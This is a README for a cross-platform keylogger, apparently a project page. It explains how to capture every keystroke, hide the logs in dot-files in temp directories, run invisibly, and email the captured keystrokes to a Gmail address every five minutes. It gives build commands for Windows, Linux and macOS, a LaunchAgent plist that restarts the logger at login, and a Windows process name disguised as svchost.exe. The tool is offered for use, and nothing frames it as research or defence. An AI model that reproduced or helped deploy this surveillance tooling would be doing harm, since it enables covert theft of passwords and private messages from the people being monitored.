# Keylogger

A cross-platform keylogger that captures keystrokes, logs them to a hidden file, and emails them periodically. Built for Windows, Linux (X11), and macOS.

## Features
- Logs all keystrokes, including special keys (e.g., `[BACKSPACE]`, `[SPACE]`).
- Stealth mode: Runs invisibly in the background.
- Emails logs every 5 minutes via Gmail SMTP with TLS.

## Prerequisites
- **Windows**: MinGW, OpenSSL (e.g., via MSYS2).
- **Linux**: X11 development libraries (`libx11-dev`), OpenSSL (`libssl-dev`).
- **macOS**: Xcode Command Line Tools, OpenSSL (`brew install openssl`).
- Gmail account with App Password for SMTP.

## Installation
1. **Clone or Download**: Get `keylogger.cpp`.
2. **Configure SMTP**:
   - Edit `SMTP_USER`, `SMTP_PASS`, `SMTP_TO` in `keylogger.cpp` with your Gmail details.
   - Generate an App Password: Google Account > Security > 2-Step Verification > App Passwords.
3. **Compile**:
   - **Windows**: 
     ```bash
     g++ keylogger.cpp -o keylogger.exe -std=c++11 -lws2_32 -llibssl -llibcrypto -I"C:\path\to\openssl\include" -L"C:\path\to\openssl\lib"
     ```
   - **Linux**: 
     ```bash
     g++ keylogger.cpp -o keylogger -std=c++11 -lX11 -lssl -lcrypto
     ```
   - **macOS**: 
     ```bash
     clang++ keylogger.cpp -o keylogger -std=c++11 -framework ApplicationServices -framework CoreFoundation -lssl -lcrypto -I/usr/local/opt/openssl/include -L/usr/local/opt/openssl/lib
     ```

## Running
- **Windows**: Double-click `keylogger.exe` or run in CMD. Console hides automatically.
- **Linux**: `./keylogger`. Terminal closes, runs in background.
- **macOS**: `./keylogger`. Terminal closes, runs in background. Optional Launch Agent:
  1. Move to `~/bin/`:
     ```bash
     mkdir -p ~/bin && mv keylogger ~/bin/ && chmod +x ~/bin/keylogger
     ```
  2. Create `~/Library/LaunchAgents/com.yourname.keylogger.plist`:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
     <plist version="1.0">
     <dict>
         <key>Label</key>
         <string>com.yourname.keylogger</string>
         <key>Program</key>
         <string>/Users/yourusername/bin/keylogger</string>
         <key>RunAtLoad</key>
         <true/>
         <key>StandardOutPath</key>
         <string>/Users/yourusername/bin/keylogger.out</string>
         <key>StandardErrorPath</key>
         <string>/Users/yourusername/bin/keylogger.err</string>
     </dict>
     </plist>
     ```
  3. Load: `launchctl load ~/Library/LaunchAgents/com.yourname.keylogger.plist`.

## Usage
- Logs to: 
  - Windows: `C:\Windows\Temp\.klog`
  - Linux: `/tmp/.klog`
  - macOS: `/var/tmp/.klog`
- Emails logs every 5 minutes to `SMTP_TO`.
- Stop:
  - Windows: Task Manager > End `svchost.exe` (spoofed name).
  - Linux: `pkill keylogger`.
  - macOS: `pkill keylogger` or `launchctl stop com.yourname.keylogger`.

## Notes
- Requires Accessibility permissions on macOS (System Settings > Privacy > Accessibility).
- Test in a VM for safety.


### Verification Notes
- **Backspace**: Fixed across all platforms (Windows: `VK_BACK`, Linux: `XK_BackSpace`, macOS: keycode 51/ASCII 8).
- **Stealth**: Unified with fork for Linux/macOS, `ShowWindow` for Windows. Launch Agent remains optional for macOS.
- **SMTP**: Consistent, requires OpenSSL and valid credentials.
